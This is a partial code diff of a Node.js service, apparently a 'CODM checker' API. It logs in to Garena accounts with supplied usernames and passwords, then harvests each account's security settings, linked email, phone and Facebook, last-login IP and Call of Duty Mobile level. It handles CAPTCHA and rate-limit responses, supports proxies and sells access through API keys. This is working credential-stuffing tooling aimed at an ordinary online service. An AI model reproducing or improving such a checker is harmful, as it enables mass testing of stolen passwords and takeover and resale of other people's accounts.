-                        case "eta": if (value !== "N/A") email = value; break;
-                        case "authenticator": authenticatorEnabled = value.toLowerCase().includes("enabled") ? "True" : "False"; break;
-                        case "two-step verification": twoStepEnabled = value.toLowerCase().includes("enabled") ? "True" : "False"; break;
-                    }
+                    // Map keys (case-insensitive, adjust based on actual script keys)
+                    if (key === "country") country = value;
+                    else if (key === "lastlogin" && !key.includes("from") && !key.includes("ip")) lastLogin = value;
+                    else if (key === "lastloginfrom") lastLoginWhere = value;
+                    else if (key === "lastloginip") lastLoginIp = value;
+                    else if (key === "ckz") ckzCount = value;
+                    else if (key === "garena shells") {
+                        const shellMatch = value.match(/(\d+)/);
+                        shell = shellMatch ? shellMatch[1] : "0";
+                    } else if (key === "facebook account" && value !== "N/A") { fbName = value; facebookBound = "True"; }
+                    else if (key === "fb link") fbLink = value;
+                    else if (key === "avatar") avatarUrl = value;
+                    else if (key === "mobile number" && value !== "N/A") mobile = value;
+                    else if (key === "tae") emailVerified = value.toLowerCase().includes("yes") ? "True" : "False"; // Assuming TAE = Email Verified
+                    else if (key === "eta" && value !== "N/A") email = value; // Assuming ETA = Email Address
+                    else if (key === "authenticator") authenticatorEnabled = value.toLowerCase().includes("enabled") ? "True" : "False";
+                    else if (key === "two-step verification") twoStepEnabled = value.toLowerCase().includes("enabled") ? "True" : "False";
+
                 } catch (parseErr) {
-                    logger.warn(`Error parsing binding line for ${accountUsername}: '${bindingClean}' - ${parseErr.message}`);
+                    log.warn(`Error parsing binding line for ${accountUsername}: '${bindingClean}' - ${parseErr}`, 'checkLogin');
                 }
             }
         });
     } else {
-        logger.warn(`Bindings data from script was not an array for ${accountUsername}: ${JSON.stringify(bindings)}`);
+        log.warn(`Bindings data from script was not an array for ${accountUsername}: ${JSON.stringify(bindings)}`, 'checkLogin');
     }
 
-     logger.info(`Account info parsed successfully for ${accountUsername}. Status: ${accountStatus}, Last Login IP: ${lastLoginIp}`);
+    log.info(`Account info parsed successfully for ${accountUsername}. Status: ${accountStatus}, Last Login IP: ${lastLoginIp}`, 'checkLogin');
 
 
-    // --- Grant Token ---
-    const grantCookies = {}; // Select specific cookies
-    if (currentCookies.datadome) grantCookies.datadome = currentCookies.datadome;
-    if (currentCookies.sso_key) grantCookies.sso_key = currentCookies.sso_key; // Might be set during login
-    // Add other necessary cookies if identified
-
+    // 4. Grant Token Request
     const grantHeaders = {
-        "Host": "auth.garena.com",
-        "Connection": "keep-alive",
+        ...baseHeaders, // Base UA etc.
         "Accept": "application/json, text/plain, */*",
         "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
         "Origin": "https://auth.garena.com",
         "Sec-Fetch-Site": "same-origin",
         "Sec-Fetch-Mode": "cors",
         "Sec-Fetch-Dest": "empty",
-        "Referer": `https://auth.garena.com/universal/oauth?all_platforms=1&response_type=token&locale=en-SG&client_id=100082&redirect_uri=${encodeURIComponent(REDIRECT_URL)}`,
-        // "Accept-Encoding": "gzip, deflate, br, zstd", // Axios handles
-        "Accept-Language": "en-US,en;q=0.9",
-        "User-Agent": selectedHeader['User-Agent'] || "Mozilla/5.0",
-        'Cookie': formatCookiesForHeader(grantCookies) // Send selected cookies
+        "Referer": 'https://auth.garena.com/universal/oauth?all_platforms=1&response_type=token&locale=en-SG&client_id=100082&redirect_uri=' + encodeURIComponent(REDIRECT_URL),
+        // Host, Connection, Accept-Encoding, Language already in baseHeaders
     };
-     // Add sec-ch-ua headers if present in selectedHeader
-    Object.keys(selectedHeader).forEach(key => {
-        if (key.toLowerCase().startsWith('sec-ch-ua')) {
-            grantHeaders[key] = selectedHeader[key];
-        }
-    });
-
-    const grantDataPayload = {
+    const grantData = new URLSearchParams({ // Use URLSearchParams for form encoding
         client_id: "100082",
         response_type: "token",
         redirect_uri: REDIRECT_URL,
         format: "json",
-        id: _id // Use the same random ID
+        id: _id // Use the same random ID? Check if necessary
+    }).toString();
+
+    // Cookies needed: datadome, sso_key (from login response headers, handled by jar)
+    log.debug(`Attempting to grant token for ${accountUsername}`, 'checkLogin');
+    const grantConfig = {
+        headers: grantHeaders,
+        timeout: 30000,
+        proxy: proxies ? proxies : false,
+        // Cookies handled by jar
     };
-    const grantData = new URLSearchParams(grantDataPayload).toString();
 
-    logger.debug(`Attempting to grant token for ${accountUsername} with cookies: ${Object.keys(grantCookies).join(', ')}`);
-
-    let accessToken = null;
+    let grantResponse;
+    let accessToken;
     try {
         const grantUrl = "https://auth.garena.com/oauth/token/grant";
-        const grantResponse = await axios.post(grantUrl, grantData, {
-            headers: grantHeaders,
-            timeout: 30000,
-            // proxy: proxies ? { host: proxyHost, port: proxyPort } : false,
-            validateStatus: status => status >= 200 && status < 500
-        });
+        grantResponse = await axiosInstance.post(grantUrl, grantData, grantConfig);
+        const grantTextClean = stripAnsiCodes(JSON.stringify(grantResponse.data));
+        log.debug(`Grant token response status: ${grantResponse.status}, data snippet: ${grantTextClean.slice(0, 200)}`, 'checkLogin');
 
-        let grantTextClean = '';
-         if(typeof grantResponse.data === 'object' && grantResponse.data !== null){
-            try{ grantTextClean = stripAnsiCodes(JSON.stringify(grantResponse.data)); } catch { grantTextClean = "[Unstringifiable grant object]" }
-         } else {
-             grantTextClean = stripAnsiCodes(String(grantResponse.data));
-         }
-
-        logger.debug(`Grant token response status: ${grantResponse.status}, text snippet: ${grantTextClean.substring(0, 200)}`);
-
-        if (detectCaptchaInResponse(grantTextClean)) {
-            logger.warn(`CAPTCHA detected in grant token response body for ${accountUsername}.`);
+         if (detectCaptchaInResponse(grantTextClean)) {
+            log.warn(`CAPTCHA detected in grant token response body for ${accountUsername}.`, 'checkLogin');
             return "[API_ERROR] CAPTCHA Detected (Grant Token Response Body)";
         }
-         if (grantResponse.status >= 400) {
-             logger.warn(`Grant token request failed with status ${grantResponse.status} for ${accountUsername}: ${grantTextClean.substring(0, 150)}`);
-              if (detectCaptchaInResponse(grantTextClean)) {
-                 return "[API_ERROR] CAPTCHA Detected (Grant Token HTTP Error)";
-             }
-             return `[API_ERROR] Grant token failed (HTTP ${grantResponse.status})`;
-         }
 
+        const grantJson = grantResponse.data;
+        if (!grantJson || typeof grantJson !== 'object') {
+            log.error(`Grant token response not a JSON object: ${grantTextClean.slice(0, 200)}`, 'checkLogin');
+            return "[API_ERROR] Grant token failed: Non-JSON response";
+        }
 
-        // Process successful grant response
-        const grantDataJson = (typeof grantResponse.data === 'object' && grantResponse.data !== null)
-                            ? grantResponse.data
-                            : JSON.parse(grantResponse.data); // Assume JSON on success
-        logger.debug(`Grant token JSON response for ${accountUsername}: ${JSON.stringify(grantDataJson)}`);
-
-        // Update cookies from grant response
-         const grantRespCookies = parseCookies(grantResponse.headers['set-cookie']);
-         currentCookies = { ...currentCookies, ...grantRespCookies }; // Merge again
-
-
-        if (grantDataJson.error) {
-            const errorMsg = grantDataJson.error;
-            logger.warn(`Grant token error field for ${accountUsername}: ${errorMsg}`);
+        if (grantJson.error) {
+            const errorMsg = grantJson.error;
+            log.warn(`Grant token error field for ${accountUsername}: ${errorMsg}`, 'checkLogin');
             if (detectCaptchaInResponse(errorMsg)) {
                 return "[API_ERROR] CAPTCHA Required (Grant Token Error Field)";
             }
             return `[API_ERROR] Grant token failed: ${errorMsg}`;
         }
-        if (!grantDataJson.access_token) {
-            logger.error(`Grant token response missing access_token for ${accountUsername}: ${JSON.stringify(grantDataJson)}`);
+        if (!grantJson.access_token) {
+            log.error(`Grant token response missing access_token for ${accountUsername}: ${JSON.stringify(grantJson)}`, 'checkLogin');
             return "[API_ERROR] Grant token response missing 'access_token'";
         }
 
-        accessToken = grantDataJson.access_token;
-        logger.info(`Access token granted for ${accountUsername}.`);
+        accessToken = grantJson.access_token;
+        // Cookies set during grant are handled by the jar
+        log.info(`Access token granted for ${accountUsername}.`, 'checkLogin');
 
     } catch (error) {
         const errorStr = stripAnsiCodes(error.toString());
-        const respText = error.response ? stripAnsiCodes(String(error.response.data)) : "";
-         const status = error.response ? error.response.status : "N/A";
-
+        const respText = stripAnsiCodes(error.response?.data ? JSON.stringify(error.response.data) : "");
         if (detectCaptchaInResponse(errorStr) || detectCaptchaInResponse(respText)) {
-            logger.warn(`CAPTCHA detected during grant token request error for ${accountUsername}: ${errorStr}`);
+            log.warn(`CAPTCHA detected during grant token request error for ${accountUsername}: ${errorStr}`, 'checkLogin');
             return "[API_ERROR] CAPTCHA Detected (Grant Token Request Error)";
         }
-         if (error.code === 'ECONNABORTED' || error.message.includes('timeout')) {
-             logger.error(`Grant token request timed out for ${accountUsername}`);
+         if (error.code === 'ETIMEDOUT' || error.code === 'ECONNABORTED') {
+            log.error(`Grant token request timed out for ${accountUsername}`, 'checkLogin');
             return "[API_ERROR][Timeout] Grant token request timed out.";
-         }
-        if (error instanceof SyntaxError) { // JSON parsing error likely
-             logger.error(`Failed to decode Grant Token JSON for ${accountUsername}: ${respText.substring(0, 200)} - Error: ${errorStr}`);
-             return `[API_ERROR] Grant token failed: Non-JSON response (${errorStr})`;
         }
-        logger.error(`Grant token request error for ${accountUsername}: ${errorStr} (Status: ${status}) Response: ${respText.substring(0,100)}`);
-        return `[API_ERROR][Request] Grant token request error: ${errorStr.substring(0, 100)}`;
+         if (error.response) {
+             const status = error.response.status;
+             log.warn(`Grant token HTTP Error ${status} for ${accountUsername}: ${JSON.stringify(error.response.data).slice(0, 200)}`, 'checkLogin');
+              // Check body for specific errors if needed
+             return `[API_ERROR][HTTP] Grant Token HTTP Error ${status}`;
+         }
+        log.error(`Grant token request error for ${accountUsername}: ${error}`, 'checkLogin');
+        return `[API_ERROR][Request] Grant token request error: ${errorStr.slice(0, 100)}`;
     }
 
-    // --- Show Level (CODM Check) ---
-    const codmCheckCookies = {}; // Select necessary cookies for show_level
-    if (currentCookies.datadome) codmCheckCookies.datadome = currentCookies.datadome;
-    if (currentCookies.sso_key) codmCheckCookies.sso_key = currentCookies.sso_key;
-    // 'token_session' might be set by grant response, include if present
-    if (currentCookies.token_session) codmCheckCookies.token_session = currentCookies.token_session;
+    // 5. Check CODM Level
+    log.debug(`Checking CODM level for ${accountUsername}`, 'checkLogin');
+    // Pass the same axios instance which holds the necessary cookies (datadome, sso_key, token_session?)
+    const codmResultStr = await showLevel(accessToken, baseHeaders, axiosInstance, proxies);
+    log.debug(`CODM check result string for ${accountUsername}: ${codmResultStr}`, 'checkLogin');
 
-    logger.debug(`Checking CODM level with cookies: ${Object.keys(codmCheckCookies).join(', ')}`);
-    const codmResultStr = await show_level(accessToken, selectedHeader, codmCheckCookies, proxies);
-    logger.debug(`CODM check result string for ${accountUsername}: ${codmResultStr}`);
-
-    // Check if show_level returned an error string
     if (typeof codmResultStr === 'string' && codmResultStr.startsWith("[")) {
-        logger.warn(`CODM check failed or warned for ${accountUsername}: ${codmResultStr}`);
-        return codmResultStr; // Propagate the error/warning string
+        log.warn(`CODM check failed or warned for ${accountUsername}: ${codmResultStr}`, 'checkLogin');
+        return codmResultStr; // Propagate the specific error/warning string
     }
 
-    // Process successful CODM result string
+    // 6. Format Final Result
     let codmNickname = "N/A", codmLevelStr = "N/A", codmRegion = "N/A", uid = "N/A";
     let connectedGamesListForJson = [];
-    let codmParseSuccess = false;
-
-    if (typeof codmResultStr === 'string' && codmResultStr.includes("|") && codmResultStr.split("|").length === 4) {
+    // Check if codmResultStr is the expected format "nick|lvl|region|uid"
+    if (typeof codmResultStr === 'string' && codmResultStr.includes("|")) {
         const parts = codmResultStr.split("|");
-        codmNickname = parts[0].trim();
-        codmLevelStr = parts[1].trim();
-        codmRegion = parts[2].trim();
-        uid = parts[3].trim();
-
-        const isValidLevel = /^\d+$/.test(codmLevelStr); // Check if level is numeric
-        if (isValidLevel && codmNickname && codmRegion && uid && codmNickname !== 'N/A') {
-            logger.info(`Successfully parsed CODM details for ${accountUsername}: Nick=${codmNickname}, Lvl=${codmLevelStr}`);
-            connectedGamesListForJson.push({
-                game: "CODM",
-                region: codmRegion,
-                level: codmLevelStr, // Keep as string initially for formatting
-                nickname: codmNickname,
-                uid: uid
-            });
-            codmParseSuccess = true;
+        if (parts.length === 4) {
+             [codmNickname, codmLevelStr, codmRegion, uid] = parts;
+             // Basic validation again
+             if (/^\d+$/.test(codmLevelStr) && codmNickname && codmRegion && uid && codmNickname !== 'N/A') {
+                 log.info(`Successfully parsed CODM details for ${accountUsername}: Nick=${codmNickname}, Lvl=${codmLevelStr}`, 'checkLogin');
+                 connectedGamesListForJson.push({
+                     game: "CODM", region: codmRegion, level: codmLevelStr,
+                     nickname: codmNickname, uid: uid
+                 });
+             } else {
+                 log.warn(`CODM result string parsed but contained invalid data: ${codmResultStr}`, 'checkLogin');
+                 return `[CODM_FAIL] Parsed invalid CODM data: ${codmResultStr.slice(0, 100)}`;
+             }
         } else {
-            logger.warn(`CODM result string parsed but contained invalid data: ${codmResultStr}`);
-            return `[CODM_FAIL] Parsed invalid CODM data: ${codmResultStr.substring(0, 100)}`;
+             log.warn(`CODM result string had pipes but wrong number of parts: ${codmResultStr}`, 'checkLogin');
+             return `[CODM_FAIL] Unexpected CODM data format (wrong parts): ${codmResultStr.slice(0, 100)}`;
         }
     } else {
-        // This case might indicate the external script didn't return the expected format even after success checks
-        logger.warning(`CODM check for ${accountUsername} returned unexpected format after success path: ${codmResultStr}`);
-        // It's possible show_level filtered out errors but format was still wrong
-        return `[CODM_FAIL] Unexpected CODM data format post-check: ${String(codmResultStr).substring(0, 100)}`;
+        // If show_level didn't return error string but result isn't the expected format
+        log.warn(`CODM check for ${accountUsername} returned unexpected format/type: ${typeof codmResultStr} -> ${String(codmResultStr).slice(0,100)}`, 'checkLogin');
+        return `[CODM_FAIL] Unexpected CODM data format: ${String(codmResultStr).slice(0, 100)}`;
     }
 
-    if (!codmParseSuccess) {
-         // This should theoretically not be reached if logic above is correct, but as a safeguard:
-         logger.error(`CODM parsing flag not set despite reaching end for ${accountUsername}. Result: ${codmResultStr}`);
-         return `[CODM_FAIL] Internal parsing state error after CODM check.`;
-    }
-
-    // --- Format Final Result ---
+    // If we reach here, everything succeeded
     const resultDict = formatResultDict(
         lastLogin, lastLoginWhere, country, shell, avatarUrl, mobile,
         facebookBound, emailVerified, authenticatorEnabled, twoStepEnabled,
         connectedGamesListForJson, fbName, fbLink, email, date,
         accountUsername, password, ckzCount, lastLoginIp, accountStatus
     );
-    logger.info(`Full check successful for ${accountUsername}. Level: ${codmLevelStr}`);
-    return resultDict; // Return the formatted result object
+    log.info(`Full check successful for ${accountUsername}. Level: ${codmLevelStr}`, 'checkLogin');
+    return resultDict; // Return the success dictionary
 }
 
+// Function to format the final successful result into a JSON-friendly object
 function formatResultDict(
     lastLogin, lastLoginWhere, country, shellStr, avatarUrl, mobile,
     facebookBoundStr, emailVerifiedStr, authenticatorEnabledStr, twoStepEnabledStr,
     connectedGamesData, fbName, fbLink, email, date,
-    username, password, // Password included here, consider redacting if logging/forwarding raw
-    ckzCount, lastLoginIp, accountStatus
+    username, password, /* OMITTED password */ ckzCount, lastLoginIp, accountStatus
 ) {
-
-    let codmInfoJson = { status: "Not Linked", level: null };
+    let codmInfoJson = { status: "Not Linked or Check Failed", level: null };
     if (connectedGamesData && connectedGamesData.length > 0) {
-        const gameData = connectedGamesData[0]; // Assuming only CODM for now
+        const gameData = connectedGamesData[0]; // Assume only CODM
         if (gameData.game === "CODM") {
             let levelVal = null;
             try {
-                levelVal = parseInt(gameData.level, 10); // Parse level string to integer
-                if (isNaN(levelVal)) levelVal = null; // Handle non-numeric case
+                const parsed = parseInt(gameData.level, 10);
+                if (!isNaN(parsed)) {
+                    levelVal = parsed;
+                }
             } catch { /* ignore */ }
 
             codmInfoJson = {
@@ -1053,25 +996,25 @@ function formatResultDict(
 
     let shellValue = 0;
     try {
-        shellValue = parseInt(shellStr, 10);
-        if (isNaN(shellValue)) shellValue = 0;
+        const parsed = parseInt(shellStr, 10);
+        if (!isNaN(parsed)) {
+            shellValue = parsed;
+        }
     } catch { /* ignore */ }
 
-    // Helper to clean 'N/A' or empty values to null for cleaner JSON
     const cleanNa = (value) => {
-        if (value === "N/A" || value === null || value === "" || String(value).toLowerCase() === "unknown") {
-            return null;
-        }
-        return value;
+        return (value === "N/A" || value === null || value === undefined || value === "" || String(value).toLowerCase() === "unknown") ? null : value;
     };
+    const cleanBoolStr = (value) => value === "True";
+
 
     const resultData = {
-        owner: EXPECTED_OWNER,
-        checker_by: "@YISHUX",
+        // owner: OWNER_TAG, // Added at the API response level
+        checker_by: CHECKER_BY_TAG,
         timestamp_utc: new Date().toISOString(),
         check_run_id: date, // Timestamp from start of check
         username: username,
-        // password: password, // Consider REMOVING password from the final result for security
+        // password: password, // --- OMITTING PASSWORD FROM RESPONSE FOR SECURITY ---
         account_status: cleanNa(accountStatus),
         account_country: cleanNa(country),
         garena_shells: shellValue,
@@ -1087,508 +1030,442 @@ function formatResultDict(
         },
         security: {
             mobile_bound: cleanNa(mobile) !== null,
-            email_verified: emailVerifiedStr === "True",
-            facebook_linked: facebookBoundStr === "True",
-            google_authenticator_enabled: authenticatorEnabledStr === "True",
-            two_step_verification_enabled: twoStepEnabledStr === "True",
+            email_verified: cleanBoolStr(emailVerifiedStr),
+            facebook_linked: cleanBoolStr(facebookBoundStr),
+            google_authenticator_enabled: cleanBoolStr(authenticatorEnabledStr),
+            two_step_verification_enabled: cleanBoolStr(twoStepEnabledStr),
         },
         codm_details: codmInfoJson,
-        ckz_count: cleanNa(ckzCount) === "UNKNOWN" ? null : cleanNa(ckzCount), // Clean UNKNOWN specifically
+        ckz_count: cleanNa(ckzCount) === "UNKNOWN" ? null : cleanNa(ckzCount),
     };
+
+    // Optional: Deep clean null values (more complex in JS)
+    // You might write a recursive helper function if needed, but the above is usually sufficient.
 
     return resultData;
 }
 
 
 async function performCheck(username, password) {
-    logger.debug(`Starting perform_check for ${username}`);
-    const date = getCurrentTimestamp(); // Timestamp for this check run
-    const randomId = String(Math.floor(Math.random() * (999999999999 - 100000000000 + 1)) + 100000000000); // 12-digit random number
+    log.debug(`Starting perform_check for ${username}`, 'performCheck');
+    const date = getCurrentTimestamp();
+    const randomId = String(Math.floor(Math.random() * 900000000000) + 100000000000); // 12 digit random ID
+    const headers = getRequestData(); // Get fresh headers for this check
 
+    // Create a dedicated axios instance with its own cookie jar for this check
+    const jar = new CookieJar();
+    const axiosInstance = axios.create({ jar });
+    axiosCookieJarSupport(axiosInstance); // Apply cookie jar support
+
+
+    const preloginParams = new URLSearchParams({
+        app_id: '100082',
+        account: username,
+        format: 'json',
+        id: randomId,
+    });
+    const preloginUrl = `https://auth.garena.com/api/prelogin?${preloginParams.toString()}`;
+
+    // 1. Prelogin Request
+    log.debug(`Performing prelogin request for ${username}`, 'performCheck');
+    let preloginResponse;
     try {
-        const { finalCookies: initialCookies, headers } = await getRequestData(); // Get headers and empty cookies obj
-        let currentCookies = { ...initialCookies }; // Make a mutable copy for this check
+        preloginResponse = await axiosInstance.get(preloginUrl, { headers: headers, timeout: 20000 }); // Use the instance with jar
+        const preloginTextClean = stripAnsiCodes(JSON.stringify(preloginResponse.data));
+        log.debug(`Prelogin response status: ${preloginResponse.status}, data snippet: ${preloginTextClean.slice(0, 200)}`, 'performCheck');
 
-        const preloginParams = {
-            app_id: "100082",
-            account: username,
-            format: "json",
-            id: randomId
-        };
-        const preloginUrl = "https://auth.garena.com/api/prelogin";
-
-        logger.debug(`Performing prelogin request for ${username}`);
-        let preloginResponse;
-        try {
-            preloginResponse = await axios.get(preloginUrl, {
-                params: preloginParams,
-                headers: headers, // Use base headers from getRequestData
-                 // Cookies are initially empty, send header if needed (usually not for prelogin)
-                 // 'Cookie': formatCookiesForHeader(currentCookies)
-                timeout: 20000, // 20 seconds
-                validateStatus: status => status >= 200 && status < 500
-            });
-
-            let preloginTextClean = '';
-             if(typeof preloginResponse.data === 'object' && preloginResponse.data !== null){
-                 try { preloginTextClean = stripAnsiCodes(JSON.stringify(preloginResponse.data)); } catch { preloginTextClean = '[Unstringifiable prelogin object]' }
-             } else {
-                 preloginTextClean = stripAnsiCodes(String(preloginResponse.data));
-             }
-            logger.debug(`Prelogin response status: ${preloginResponse.status}, text snippet: ${preloginTextClean.substring(0, 200)}`);
-
-            if (detectCaptchaInResponse(preloginTextClean) || (preloginResponse.status >= 400 && detectCaptchaInResponse(preloginTextClean))) {
-                logger.warn(`CAPTCHA detected in prelogin response for ${username}.`);
-                return "[API_ERROR] CAPTCHA Detected (Prelogin Response)";
-            }
-
-            // Handle HTTP errors after CAPTCHA
-             if (preloginResponse.status === 403) {
-                 logger.warn(`Prelogin forbidden (403) for ${username}: ${preloginTextClean.substring(0, 100)}`);
-                 return `[API_ERROR] Prelogin Forbidden (403)`;
-             }
-             if (preloginResponse.status === 429) {
-                 logger.warn(`Prelogin rate limited (429) for ${username}`);
-                 return "[API_ERROR][RateLimit] Prelogin Rate Limited (429)";
-             }
-             if (preloginResponse.status >= 400) {
-                 logger.warn(`Prelogin HTTP Error ${preloginResponse.status} for ${username}: ${preloginTextClean.substring(0, 200)}`);
-                 return `[API_ERROR][HTTP] Prelogin HTTP ${preloginResponse.status}`;
-             }
-
-        } catch (error) {
-            const errorStr = stripAnsiCodes(error.toString());
-            const status = error.response ? error.response.status : "N/A";
-
-             if (detectCaptchaInResponse(errorStr) || (error.response && detectCaptchaInResponse(String(error.response.data)))) {
-                logger.warn(`CAPTCHA detected during prelogin request error for ${username}: ${errorStr}`);
-                return "[API_ERROR] CAPTCHA Detected (Prelogin Request Error)";
-            }
-             if (error.code === 'ECONNABORTED' || error.message.includes('timeout')) {
-                logger.error(`Prelogin timed out for ${username}`);
-                return "[API_ERROR][Timeout] Prelogin Timed Out";
-             }
-            logger.error(`Prelogin request failed for ${username}: ${errorStr} (Status: ${status})`);
-            return `[API_ERROR][Request] Prelogin Request Failed: ${errorStr.substring(0, 100)}`;
+        if (detectCaptchaInResponse(preloginTextClean)) {
+             log.warn(`CAPTCHA detected in prelogin response for ${username}.`, 'performCheck');
+             return "[API_ERROR] CAPTCHA Detected (Prelogin Response)";
         }
-
-        // Process successful prelogin response
-        let preloginJson;
-        try {
-             preloginJson = (typeof preloginResponse.data === 'object' && preloginResponse.data !== null)
-                         ? preloginResponse.data
-                         : JSON.parse(preloginResponse.data);
-             logger.debug(`Prelogin JSON response for ${username}: ${JSON.stringify(preloginJson)}`);
-        } catch (e) {
-            const preloginTextClean = stripAnsiCodes(String(preloginResponse.data));
-            logger.error(`Invalid Prelogin JSON for ${username}: ${preloginTextClean.substring(0, 200)}`);
-            return `[API_ERROR] Invalid Prelogin JSON`;
-        }
-
-        // Extract cookies from prelogin (especially datadome)
-        const preloginCookies = parseCookies(preloginResponse.headers['set-cookie']);
-        const datadomeCookie = preloginCookies.datadome || null;
-        if (datadomeCookie) {
-             // Add *all* cookies from prelogin to current state for checkLogin
-             currentCookies = { ...currentCookies, ...preloginCookies };
-             logger.debug(`Datadome cookie obtained from prelogin for ${username}. All prelogin cookies merged.`);
-        } else {
-            logger.debug(`No Datadome cookie in prelogin response for ${username}.`);
-             // Still merge other cookies if any
-             currentCookies = { ...currentCookies, ...preloginCookies };
-        }
-
-        // Check for errors in prelogin JSON data
-        if (preloginJson.error) {
-            const errorMsg = preloginJson.error;
-            logger.warn(`Prelogin error field for ${username}: ${errorMsg}`);
-            if (detectCaptchaInResponse(errorMsg)) {
-                return "[API_ERROR] CAPTCHA Required (Prelogin Error Field)";
-            }
-            if (errorMsg === 'error_account_does_not_exist') {
-                return "[LOGIN_FAIL] Account doesn't exist"; // Fail early if account not found
-            }
-             // Handle other potential prelogin errors
-            return `[API_ERROR] Prelogin Error: ${errorMsg}`;
-        }
-
-        const v1 = preloginJson.v1;
-        const v2 = preloginJson.v2;
-        if (!v1 || !v2) {
-            logger.error(`Prelogin data missing v1/v2 for ${username}: ${JSON.stringify(preloginJson)}`);
-            return "[API_ERROR] Prelogin Data Missing (v1/v2)";
-        }
-
-        // Encrypt password using v1/v2
-        const encryptedPassword = getEncryptedPassword(password, v1, v2);
-
-        // Call the main login and checking logic
-        const loginResult = await checkLogin(
-            username,
-            randomId,
-            encryptedPassword,
-            password, // Pass original password for potential use in formatting/forwarding
-            headers, // Pass the base headers used
-            currentCookies, // Pass cookies obtained so far (including from prelogin)
-            datadomeCookie, // Pass datadome specifically for checkLogin's logic
-            date, // Pass the check run timestamp
-            null // Proxies not implemented here
-        );
-
-        return loginResult; // Return the result (object on success, string on error)
+         // Cookies from prelogin (like datadome) are now stored in axiosInstance.defaults.jar
 
     } catch (error) {
-        // Catch unexpected errors during the performCheck orchestration
-        const errStr = stripAnsiCodes(error.toString());
-        if (detectCaptchaInResponse(errStr)) { // Catch-all for captcha mentioned anywhere
-            logger.warn(`CAPTCHA potentially detected during unexpected error in perform_check for ${username}.`);
-            return "[API_ERROR] CAPTCHA Detected (perform_check Unexpected)";
+        const errorStr = stripAnsiCodes(error.toString());
+        const respText = stripAnsiCodes(error.response?.data ? JSON.stringify(error.response.data) : "");
+        if (detectCaptchaInResponse(errorStr) || detectCaptchaInResponse(respText)) {
+            log.warn(`CAPTCHA detected during prelogin request error for ${username}: ${errorStr}`, 'performCheck');
+            return "[API_ERROR] CAPTCHA Detected (Prelogin Request Error)";
         }
-        logger.error(`Unexpected error in perform_check for ${username}: ${error.stack || error}`);
-        return `[API_ERROR] Unexpected Error in perform_check: ${errStr.substring(0, 100)}`;
+        if (error.code === 'ETIMEDOUT' || error.code === 'ECONNABORTED') {
+            log.error(`Prelogin timed out for ${username}`, 'performCheck');
+            return "[API_ERROR][Timeout] Prelogin Timed Out";
+        }
+        if (error.response) {
+            const status = error.response.status;
+             const respData = error.response.data;
+            log.warn(`Prelogin HTTP Error ${status} for ${username}: ${JSON.stringify(respData).slice(0, 200)}`, 'performCheck');
+            if (status === 403) return `[API_ERROR] Prelogin Forbidden (403)`;
+            if (status === 429) return "[API_ERROR][RateLimit] Prelogin Rate Limited (429)";
+             // Check error message in body for specific Garena prelogin errors
+             if (respData && typeof respData === 'object' && respData.error) {
+                 const garenaError = respData.error;
+                 if (garenaError === 'error_account_does_not_exist') {
+                     return "[LOGIN_FAIL] Account doesn't exist"; // Treat as login fail
+                 }
+                  // Add other known prelogin errors if they indicate definitive failure
+                 return `[API_ERROR] Prelogin Error: ${garenaError}`;
+             }
+            return `[API_ERROR][HTTP] Prelogin HTTP ${status}`;
+        }
+        log.error(`Prelogin request failed for ${username}: ${error}`, 'performCheck');
+        return `[API_ERROR][Request] Prelogin Request Failed: ${errorStr.slice(0, 100)}`;
     }
+
+    // 2. Parse Prelogin Response Data
+    const data = preloginResponse.data;
+     if (!data || typeof data !== 'object') {
+        log.error(`Invalid Prelogin JSON (not object) for ${username}: ${JSON.stringify(data).slice(0, 200)}`, 'performCheck');
+        return `[API_ERROR] Invalid Prelogin JSON`;
+    }
+     // Check error field again even if status was 2xx
+     if (data.error) {
+        const errorMsg = data.error;
+        log.warn(`Prelogin error field for ${username}: ${errorMsg}`, 'performCheck');
+        if (detectCaptchaInResponse(errorMsg)) {
+            return "[API_ERROR] CAPTCHA Required (Prelogin Error Field)";
+        }
+        if (errorMsg === 'error_account_does_not_exist') {
+            return "[LOGIN_FAIL] Account doesn't exist";
+        }
+        return `[API_ERROR] Prelogin Error: ${errorMsg}`;
+    }
+
+    const v1 = data.v1;
+    const v2 = data.v2;
+    if (!v1 || !v2) {
+        log.error(`Prelogin data missing v1/v2 for ${username}: ${JSON.stringify(data)}`, 'performCheck');
+        return "[API_ERROR] Prelogin Data Missing (v1/v2)";
+    }
+
+    // Datadome cookie from prelogin response headers is now in the jar, no need to pass explicitly
+
+
+    // 3. Encrypt Password & Call check_login
+    let encryptedPassword;
+    try {
+        encryptedPassword = getEncryptedPassword(password, v1, v2);
+    } catch (encError) {
+         log.error(`Failed to encrypt password for ${username}: ${encError}`, 'performCheck');
+         return "[API_ERROR] Password encryption failed";
+    }
+
+
+    // Call the main login/check logic using the same axios instance and headers
+    const loginResult = await checkLogin(
+        username,
+        randomId,
+        encryptedPassword,
+        password, // Pass original password for formatting (but don't return in API)
+        headers, // Pass the base headers
+        axiosInstance, // Pass the axios instance with the cookie jar
+        date,
+        null // No proxy by default
+    );
+
+    return loginResult; // Return the dict or error string from check_login
+
 }
 
 
-// --- Express App Setup ---
+// --- Express Application ---
 const app = express();
+// Configure 'trust proxy' if running behind a reverse proxy (like Nginx, Heroku)
+// to get the correct req.ip
+app.set('trust proxy', 1); // Adjust the number based on your proxy setup
 
-// Middleware for logging requests (optional)
-app.use((req, res, next) => {
-    logger.debug(`Incoming Request: ${req.method} ${req.url} from ${req.ip}`);
-    next();
-});
-
-// --- Routes ---
-
-// Root Route
-app.get('/', (req, res) => {
-    const responseData = {
-        status: "ok",
-        message: "S1N CODM Checker API (Node.js) is running.",
-        owner: EXPECTED_OWNER
-    };
-    // Ensure owner tag consistency
-    if (responseData.owner !== EXPECTED_OWNER) {
-        logger.crit("!!! CRITICAL: Owner tag modified or missing in root response! Forcing correct owner. !!!");
-        responseData.owner = EXPECTED_OWNER;
-    }
-    res.status(200).json(responseData);
-});
-
-// CODM Check Route
 app.get('/codm', async (req, res) => {
-    const username = req.query.username;
-    const password = req.query.password;
-    const clientIp = req.ip || req.connection.remoteAddress;
+    // Reload keys on each request for simplicity and to reflect bot changes
+    await loadApiKeys();
 
-    logger.info(`Request received from ${clientIp}: user=${username}`); // Avoid logging password here
+    const { apikey, username, password } = req.query;
+    const clientIp = req.ip;
 
-    if (!username || !password) {
-        logger.warn(`Missing username or password from ${clientIp}`);
-        const responseData = {
-            status: "error",
-            message: "Missing username or password parameter",
-            owner: EXPECTED_OWNER
-        };
-        return res.status(400).json(responseData);
